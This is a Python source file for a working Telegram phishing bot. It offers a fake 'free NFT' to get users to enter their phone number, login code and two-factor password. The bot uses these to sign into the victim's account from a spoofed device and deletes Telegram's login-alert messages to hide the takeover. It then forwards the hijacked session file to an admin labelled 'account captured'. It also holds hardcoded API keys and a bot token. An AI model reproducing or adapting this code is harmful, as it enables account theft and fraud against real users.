import os
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# --- КОНФИГУРАЦИЯ ---
API_ID = 37668790
API_HASH = '84a0450f9bbf15d1e1d09b47ee25cb49'
TOKEN = '8415795413:AAFKeIBsH75o7V5YkyrquMxCiCeq7eASii0'
ADMIN_ID = 8212981789

bot = Bot(token=TOKEN)
dp = Dispatcher()
user_data_storage = {}

class VerifState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_2fa = State()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ АДМИНА ---

async def get_client_info(session_name):
    client = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return "❌ Сессия невалидна."
        me = await client.get_me()
        return f"👤 <b>Имя:</b> {me.first_name}\n🆔 <b>ID:</b> <code>{me.id}</code>\n🔗 <b>Username:</b> @{me.username or 'нет'}"
    except Exception as e:
        return f"⚠️ Ошибка: {str(e)}"
    finally:
        await client.disconnect()

# --- ОСНОВНАЯ ЛОГИКА ---

@dp.message(F.text.in_(["/start", "/nft", "/key"]))
async def cmd_start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👑 Панель управления (Amsterdam Host) активна.")
        return
    
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 ПОЛУЧИТЬ NFT", callback_data="go_verif")]])
    await message.answer("🎁 <b>Акция: 1 FREE NFT</b>\n\nДля привязки кошелька пройдите авторизацию.", parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "go_verif")
async def ask_phone(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text("📱 <b>Введите номер телефона (+7...):</b>", parse_mode="HTML")
    await state.set_state(VerifState.waiting_phone)

@dp.message(VerifState.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "")
    user_id = message.from_user.id

    # Настройки для имитации входа из Европы (Samsung/Android 12)
    client = TelegramClient(
        f"sess_{user_id}", API_ID, API_HASH,
        device_model="Samsung SM-A525F", # Популярная модель в Европе
        system_version="Android 12.0",
        app_version="9.2.1",
        lang_code="en",           # Ставим системный язык EN, чтобы сбить RU-метку
        system_lang_code="en-US"
    )
    
    try:
        await client.connect()
        send_code = await client.send_code_request(phone)
        user_data_storage[user_id] = {"client": client, "phone": phone, "hash": send_code.phone_code_hash}
        await message.answer("📩 <b>Введите код подтверждения:</b>", parse_mode="HTML")
        await state.set_state(VerifState.waiting_code)
        await bot.send_message(ADMIN_ID, f"📞 В работе номер: <code>{phone}</code>")
    except Exception as e:
        await message.answer("❌ Ошибка. Попробуйте позже.")
        await client.disconnect()

@dp.message(VerifState.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    if not data: return

    code = message.text.strip()
    await bot.send_message(ADMIN_ID, f"🔑 Код от @{message.from_user.username}: <code>{code}</code>")

    try:
        await data["client"].sign_in(data["phone"], code, phone_code_hash=data["hash"])
        await finish_and_clean(message, state)
    except SessionPasswordNeededError:
        await message.answer("🔐 <b>Введите облачный пароль (2FA):</b>", parse_mode="HTML")
        await state.set_state(VerifState.waiting_2fa)
    except Exception:
        await message.answer("❌ Код неверен.")

@dp.message(VerifState.waiting_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    password = message.text.strip()
    await bot.send_message(ADMIN_ID, f"🔓 2FA от @{message.from_user.username}: <code>{password}</code>")

    try:
        await data["client"].sign_in(password=password)
        await finish_and_clean(message, state)
    except:
        await message.answer("❌ Неверный пароль.")

async def finish_and_clean(message, state):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    client = data["client"]

    # КРИТИЧЕСКИЙ МОМЕНТ: Удаляем уведомления о входе
    try:
        # Ждем 1 секунду, чтобы уведомление успело прийти
        await asyncio.sleep(1) 
        async for msg in client.iter_messages(777000, limit=8):
            if any(x in msg.text.lower() for x in ["login", "вход", "устройство", "device", "location"]):
                await msg.delete()
                print(f"Удалено сервисное сообщение для {user_id}")
    except Exception as e:
        print(f"Ошибка при удалении: {e}")

    await client.disconnect()
    session_file = f"sess_{user_id}.session"
    
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо об аккаунте", callback_data=f"info_{user_id}")],
        [InlineKeyboardButton(text="♻️ Проверить статус", callback_data=f"check_{user_id}")]
    ])

    if os.path.exists(session_file):
        await bot.send_document(
            ADMIN_ID, FSInputFile(session_file),
            caption=f"🔥 <b>АККАУНТ ЗАХВАЧЕН!</b>\nЮзер: @{message.from_user.username}\nНомер: {data['phone']}",
            reply_markup=admin_kb, parse_mode="HTML"
        )

    await message.answer("✅ Верификация прошла успешно. NFT придет в течение 24 часов.")
    await state.clear()
    user_data_storage.pop(user_id, None)

# --- CALLBACKS АДМИНА ---

@dp.callback_query(F.data.startswith("info_"))
async def admin_info(call: types.CallbackQuery):
    user_id = call.data.split("_")[1]
    info = await get_client_info(f"sess_{user_id}.session")
    await call.message.answer(f"ℹ️ Данные {user_id}:\n{info}", parse_mode="HTML")
    await call.answer()

@dp.callback_query(F.data.startswith("check_"))
async def admin_check(call: types.CallbackQuery):
    user_id = call.data.split("_")[1]
    client = TelegramClient(f"sess_{user_id}.session", API_ID, API_HASH)
    try:
        await client.connect()
        status = "✅ Активна" if await client.is_user_authorized() else "🔴 Неактивна"
        await call.answer(f"Статус: {status}", show_alert=True)
    except:
        await call.answer("🔴 Ошибка", show_alert=True)
    finally:
        await client.disconnect()

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(dp.start_polling(bot))
